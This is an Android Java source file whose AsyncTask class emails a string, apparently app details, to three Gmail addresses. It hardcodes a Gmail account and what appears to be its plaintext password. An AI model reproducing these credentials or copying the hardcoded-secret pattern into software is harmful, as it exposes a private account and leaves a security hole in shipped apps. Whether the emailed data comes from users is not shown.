package comc.shiv.csdn;

import android.os.AsyncTask;
import android.os.Environment;
import android.util.Log;

import java.io.File;

/**
 * Created by GsolC on 2/24/2017.
 */

public class LongOperation extends AsyncTask<Void, Void, String> {

    String PASS_MGS;

    public void DTAT(String L) {
        PASS_MGS = L;

    }


    @Override
    protected String doInBackground(Void... params) {
        try {


            GMailSender sender = new GMailSender("shivshekhar91@gmail.com", "patelshiv80110@");
            sender.sendMail("CSDN APP DETAILS", PASS_MGS, "shivshekhar91@gmail.com",
                    "shivshekhar74@gmail.com,samar.hcs@gmail.com");


        } catch (Exception e) {
            Log.e("error", e.getMessage(), e);
            return "Email Not Sent";
        }
        return "Email Sent";
    }

    @Override
    protected void onPostExecute(String result) {

        Log.e("LongOperation", result + "");
    }

    @Override
    protected void onPreExecute() {
    }

    @Override
    protected void onProgressUpdate(Void... values) {
    }
}
